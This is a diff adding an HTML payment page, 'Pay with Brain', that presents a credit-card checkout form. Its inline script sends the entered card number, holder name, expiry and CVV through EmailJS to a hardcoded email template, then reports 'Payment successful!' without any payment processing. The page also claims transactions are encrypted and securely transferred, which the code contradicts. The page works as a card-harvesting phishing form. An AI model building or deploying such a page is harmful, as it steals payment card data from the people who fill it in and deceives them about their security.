@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pay with Brain</title>
+    <!-- * Bootstrap CDN CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
+    <!-- * Custom CSS -->
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./bgStyle.css">
+    <link rel="stylesheet" href="./styleBG.css">
+</head>
+
+<body onload="myFunction()" style="margin:0;">
+
+    <div id="loader"></div>
+    <div style="display:none;" id="myDiv" class="animate-bottom conta iner">
+
+        <!-- ! Page Content Starts -->
+        <!-- Second Fancy BG -->
+        <div class="header">
+
+            <!--Content before waves-->
+            <div class="inner-header flex">
+                <!-- == THE MAIN PAGE CONTENTS WILL BE HERE -->
+
+                <div class="row pageCover">
+                    <div class="col-md-6 col-12">
+                        <!-- ! Section for the card panel -->
+                        <div class="card">
+                            <div class="front">
+
+                                <!-- * Card logo -->
+                                <div class="card-logo">
+                                    <img src="./Gozkybrain_NG.PNG" alt="">
+                                </div>
+
+                                <!-- * Card number -->
+                                <div class="card-number" style="margin-top: 25px; text-align: center;">**** **** ****
+                                    ****</div>
+
+                                <!-- * Card holder and expiry -->
+                                <div class="card-info">
+                                    <div style="text-align: center; color: #fff;">
+                                        Expires on <span class="expiry">MM/YY</span>
+                                    </div>
+                                    <div class="card-holder" style="margin-top: 15px; float: left;">CARD HOLDER</div>
+                                    <div style="text-align: right; color: #fff; font-size: 35px;">
+                                        <i class="fa-brands fa-cc-visa"></i>
+                                    </div>
+
+                                </div>
+                            </div>
+
+                            <div class="back">
+                                <!-- * Card logo -->
+                                <div class="card-logo">
+                                    <img src="./Gozkybrain_NG.PNG" alt="">
+                                </div>
+                                <!-- * CVV on the back of the card -->
+                                <div
+                                    style="background-color: #fff; width: 100%; padding: 6px; text-align: center; margin: 40px 0;">
+                                    <div class="cvv flipped">CVV</div>
+                                </div>
+                                <p style="text-align: center;">All transactions are encrypted, and are securely
+                                    transferred.</p>
+                            </div>
+                        </div>
+
+
+
+
+                        <!-- == Error and Success Messages -->
+                        <div class="myMsg">
+                            <div id="default-message" class="alert alert-primary mt-3">
+                                <i class="fas fa-info-circle"></i> Please enter only valid information
+                            </div>
+                            <!-- Success message -->
+                            <div id="success-message" class="alert alert-success mt-3" style="display: none;">
+                                <i class="fas fa-check-circle"></i> Payment successful!
+                            </div>
+
+                            <!-- Error message -->
+                            <div id="error-message" class="alert alert-danger mt-3" style="display: none;">
+                                <i class="fas fa-times-circle"></i> Invalid card details. Please check and try again.
+                            </div>
+                        </div>
+                        <!-- == Messages End Here -->
+
+
+                        <!-- ! Card Section Ends -->
+                    </div>
+
+                    <div class="col-md-6 col-12">
+                        <!-- ! Section for the Form Panel -->
+                        <form id="payment-form">
+                            <!-- Start of input section -->
+                            <!-- Card number input -->
+                            <div class="form-group">
+                                <label for="card-number">Card Number</label>
+                                <input type="text" class="form-control" id="card-number" maxlength="16" required>
+                            </div>
+                            <!-- Card holder input -->
+                            <div class="form-group">
+                                <label for="card-holder">Card Holder</label>
+                                <input type="text" class="form-control" id="card-holder" required>
+                            </div>
+                            <!-- Expiry input -->
+                            <div class="form-group">
+                                <label for="expiry">Expiry</label>
+                                <input type="text" class="form-control" id="expiry" required>
+                            </div>
+                            <!-- CVV input -->
+                            <div class="form-group">
+                                <label for="cvv">CVV</label>
+                                <input type="text" class="form-control" id="cvv" maxlength="3" required>
+                            </div>
+                            <!-- End of input section -->
+
+                            <!-- Submit button -->
+                            <div style="text-align: center;">
+                                <button id="myBtn" class="btn btn-primary" style="width: 100%;">Pay Now</button>
+                            </div>
+
+                        </form>
+                    </div>
+
+
+
+                </div>
+
+                <!-- ==the contents end here -->
+            </div>
+
+            <!--Waves Container-->
+            <div>
+                <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                    viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+                    <defs>
+                        <path id="gentle-wave"
+                            d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+                    </defs>
+                    <g class="parallax">
+                        <use xlink:href="#gentle-wave" x="48" y="0" fill="rgba(255,255,255,0.7" />
+                        <use xlink:href="#gentle-wave" x="48" y="3" fill="rgba(255,255,255,0.5)" />
+                        <use xlink:href="#gentle-wave" x="48" y="5" fill="rgba(255,255,255,0.3)" />
+                        <use xlink:href="#gentle-wave" x="48" y="7" fill="#fff" />
+                    </g>
+                </svg>
+            </div>
+            <!--Waves end-->
+
+        </div>
+        <!--Header ends-->
+
+
+    </div>
+
+
+    <!-- ** Script to handle loader -->
+    <script>
+        var myVar;
+
+        function myFunction() {
+            myVar = setTimeout(showPage, 1000);
+        }
+
+        function showPage() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("myDiv").style.display = "block";
+        }
+    </script>
+
+    <!-- ** Bootstrap CDN Scripts -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"></script>
+
+    <!-- ** Font Awesome Kit -->
+    <!-- ? <script src="https://kit.fontawesome.com/ce17ce17c5a432.js"></script> -->
+    <script src="https://kit.fontawesome.com/ce17c5a432.js" crossorigin="anonymous"></script>
+
+    <!-- ** Custom Script -->
+    <script src="script.js"></script>
+
+    <!-- ** Tags from Email.JS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Set your EmailJS environment variables
+        var userEmailJSUserId = "OwjLOAVlUhzAPKLHT";
+        var userEmailJSServiceId = "service_fgxuyeh";
+        var userEmailJSTemplateId = "template_86t6xpp";
+    
+        // Initialize EmailJS with your user ID
+        emailjs.init(userEmailJSUserId);
+    
+        
+        // Add event listener to the form submission
+        document.getElementById('payment-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent default form submission
+    
+            // Get user's entered card details
+            const cardHolder = document.getElementById('card-holder').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const cvv = document.getElementById('cvv').value;
+            const exp = document.getElementById('expiry').value;
+    
+            // Set up the parameters for sending the email
+            const params = {
+                card_holder: cardHolder,
+                card_number: cardNumber,
+                cvv: cvv,
+                exp: exp
+            };
+    
+            // Send the email using Email.js
+            emailjs.send(userEmailJSServiceId, userEmailJSTemplateId, params, userEmailJSUserId)
+                .then(function (response) {
+                    console.log('Email sent successfully:', response);
+                    showSuccessMessage(); // Display success message to the user
+                    clearFormFields();    // Clear form fields
+                })
+                .catch(function (error) {
+                    console.error('Email failed to send:', error);
+                    showErrorMessage(); // Display error message to the user
+                });
+        });
+    
+        // Function to clear form fields
+        function clearFormFields() {
+            document.getElementById('card-holder').value = '';
+            document.getElementById('card-number').value = '';
+            document.getElementById('cvv').value = '';
+            document.getElementById('expiry').value = '';
+        }
+    </script>
+
+
+
+</body>
+
+</html>
